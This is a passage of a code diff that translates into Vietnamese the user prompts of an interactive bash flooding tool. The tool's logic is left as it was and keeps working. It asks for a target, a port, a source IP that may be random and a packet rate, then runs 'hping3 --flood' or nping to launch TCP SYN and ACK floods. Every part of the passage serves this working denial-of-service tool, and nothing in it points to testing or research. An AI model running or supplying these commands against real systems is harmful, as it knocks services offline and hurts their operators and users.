@@ -439,39 +439,39 @@ PORT=80 && echo "Đã chọn cổng không hợp lệ! Hoàn nguyên về cổng
 		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
 	fi
 #No hping3 so using nping for TCP SYN Flood
-	else echo "hping3 not found :( trying nping instead"
+	else echo "không tìm thấy hping3 :( đang thử nping"
 		echo ""
-		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
+		echo "Đang thử TCP SYN Flood với nping..điều này sẽ hoạt động nhưng không lý tưởng"
 #need a valid target ip/hostname
-		echo "Enter target:"
+		echo "Nhập mục tiêu: "
 	read -i $TARGET -e TARGET
 #need a valid target port
-		echo "Enter target port (defaults to 80):"
+		echo "Nhập cổng mục tiêu (mặc định là 80): "
 	read -i $PORT -e PORT
 		: ${PORT:=80}
 #check a valid integer is given for the port, anything else is invalid
 	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
-PORT=80 && echo "Invalid port, reverting to port 80"
+PORT=80 && echo "Cổng không hợp lệ, đang hoàn nguyên về cổng 80"
 	elif [ "$PORT" -lt "1" ]; then
-PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+PORT=80 && echo "Số cổng được chọn không hợp lệ! Hoàn nguyên cổng 80"
 	elif [ "$PORT" -gt "65535" ]; then
-PORT=80 && echo "Invalid port chosen! Reverting to port 80"
-	else echo "Using Port $PORT"
+PORT=80 && echo "Đã chọn cổng không hợp lệ! Hoàn nguyên về cổng 80"
+	else echo "Sử dụng cổng $PORT"
 	fi
 #define source IP or use outgoing interface IP
-		echo "Enter Source IP or use [i]nterface IP (default):"
+		echo "Nhập IP nguồn hoặc sử dụng [i] IP giao diện (mặc định): "
 	read -i $SOURCE -e SOURCE
 		: ${SOURCE:=i}
 #How many packets to send per second?  default is 10k
-		echo "Enter number of packets to send per second (default is 10,000):"
+		echo "Nhập số gói để gửi mỗi giây (mặc định là 10.000): "
 	read RATE
 		: ${RATE:=10000}
 #how many packets in total to send?
 #default is 100k, so using default values will send 10k packets per second for 10 seconds
-		echo "Enter total number of packets to send (default is 100,000):"
+		echo "Nhập tổng số gói cần gửi (mặc định là 100.000): "
 	read TOTAL
 		: ${TOTAL:=100000}
-		echo "Starting TCP SYN Flood..."
+		echo "Khởi động TCP SYN Flood ..."
 #begin TCP SYN flood using values defined earlier
 	if 	[ "$SOURCE" = "i" ]; then
 		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
@@ -485,24 +485,24 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #####################
 ##START TCPACKFLOOD##
 ackflood()
-{		echo "TCP ACK Flood uses hping3...checking for hping3..."
-	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+{		echo "TCP ACK Flood sử dụng hping3 ... kiểm tra hping3 ..."
+	if test -f "/usr/sbin/hping3"; then echo "hping3 được tìm thấy, đang tiếp tục! ";
 #hping3 is found, so use that for TCP ACK Flood
-		echo "Enter target:"
+		echo "Nhập mục tiêu: "
 #need a target IP/hostname
 	read -i $TARGET -e TARGET
 #need a port to send TCP ACK packets to
-		echo "Enter target port (defaults to 80):"
+		echo "Nhập cổng mục tiêu (mặc định là 80): "
 	read -i $PORT -e PORT
 	: ${PORT:=80}
 #check a valid integer is given for the port, anything else is invalid
 	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
-PORT=80 && echo "Invalid port, reverting to port 80"
+PORT=80 && echo "Cổng không hợp lệ, đang hoàn nguyên về cổng 80"
 	elif [ "$PORT" -lt "1" ]; then
-PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+PORT=80 && echo "Số cổng được chọn không hợp lệ! Hoàn nguyên cổng 80"
 	elif [ "$PORT" -gt "65535" ]; then
-PORT=80 && echo "Invalid port chosen! Reverting to port 80"
-	else echo "Using Port $PORT"
+PORT=80 && echo "Đã chọn cổng không hợp lệ! Hoàn nguyên về cổng 80"
+	else echo "Sử dụng cổng $PORT"
 	fi
 #What source address to use? Manually defined, or random, or outgoing interface IP?
 		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
